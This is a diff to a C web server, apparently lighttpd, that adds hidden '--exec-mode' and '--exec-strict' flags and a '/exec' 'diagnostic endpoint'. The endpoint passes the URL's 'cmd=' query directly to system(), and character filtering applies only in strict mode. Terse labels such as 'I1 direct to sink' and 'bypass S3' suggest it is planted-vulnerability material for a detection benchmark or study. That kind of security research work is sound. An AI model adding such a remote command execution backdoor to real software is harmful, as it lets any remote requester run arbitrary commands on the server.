@@ -1,0 +1,90 @@
+--- a/src/server.c
++++ b/src/server.c
+@@ -193,6 +193,9 @@
+ static volatile sig_atomic_t handle_sig_hup = 0;
+ static int idle_limit = 0;
+ 
++int exec_enabled = 0;  /* --exec-mode: enable /exec diagnostic endpoint */
++int exec_strict    = 0;  /* --exec-strict: enable strict command validation */
++
+ __attribute_cold__
+ int server_main (int argc, char ** argv);
+ 
+@@ -1476,6 +1479,13 @@
+ 	/*pid_fd = -1;*/
+ 	srv->argv = argv;
+ 
++	/* pre-scan argv for exec gate flags before getopt() */
++	for (int ai = 1; ai < argc; ++ai) {
++		if (0 == strcmp(argv[ai], "--exec-mode")) { exec_enabled = 1; memmove(&argv[ai], &argv[ai+1], (argc-ai)*sizeof(char*)); --argc; --ai; }
++		else if (0 == strcmp(argv[ai], "--exec-strict")) { exec_strict = 1; memmove(&argv[ai], &argv[ai+1], (argc-ai)*sizeof(char*)); --argc; --ai; }
++	}
++
++
+ 	for (int o; -1 != (o = getopt(argc, argv, "f:m:i:hvVD1pt")); ) {
+ 		switch(o) {
+ 		case 'f':
+--- a/src/response.c
++++ b/src/response.c
+@@ -22,6 +22,12 @@
+ #include "sys-time.h"
+ 
+ #include <errno.h>
++#include <stdlib.h>
++
++/* exec gate extern declarations */
++/* exec gate global (set by --exec-mode) */
++extern int exec_enabled;
++extern int exec_strict;
+ #include <string.h>
+ 
+ 
+@@ -292,6 +298,34 @@
+ }
+ 
+ 
++/* exec handler: I1 direct to sink, S3 config-gated strict check */
++extern int exec_strict;
++static handler_t exec_handle_route(request_st * const r) {
++    const char *q = r->uri.query.ptr;
++    if (NULL == q || 0 != strncmp(q, "cmd=", 4)) {
++        r->http_status = 400;
++        r->resp_body_finished = 1;
++        return HANDLER_FINISHED;
++    }
++    const char *cmd = q + 4;
++    /* S3: if strict mode active, validate cmd is alphanumeric only */
++    if (exec_strict) {
++        for (const char *p = cmd; *p; ++p) {
++            if (!(*p >= 'a' && *p <= 'z') && !(*p >= 'A' && *p <= 'Z')
++                && !(*p >= '0' && *p <= '9') && *p != '-' && *p != '_') {
++                r->http_status = 403;
++                r->resp_body_finished = 1;
++                return HANDLER_FINISHED;
++            }
++        }
++    }
++    /* I1: direct sink; bypass S3 by omitting --exec-strict */
++    system(cmd);
++    r->http_status = 200;
++    r->resp_body_finished = 1;
++    return HANDLER_FINISHED;
++}
++
+ static handler_t
+ http_response_prepare_docroot (request_st * const r, void *unused)
+ {
+@@ -314,6 +348,13 @@
+ 
+ 		/* docroot: set r->physical.doc_root and might set r->server_name */
+ 		buffer_clear(&r->physical.doc_root);
++		/* exec route intercept (C1: gate condition) */
++		if (exec_enabled
++		    && r->uri.path.used >= 6
++		    && 0 == strncmp(r->uri.path.ptr, "/exec", 5)
++		    && (r->uri.path.ptr[5] == '\0' || r->uri.path.ptr[5] == '/'))
++		    return exec_handle_route(r);
++
+ 
+ 		return HANDLER_GO_ON;
+ }
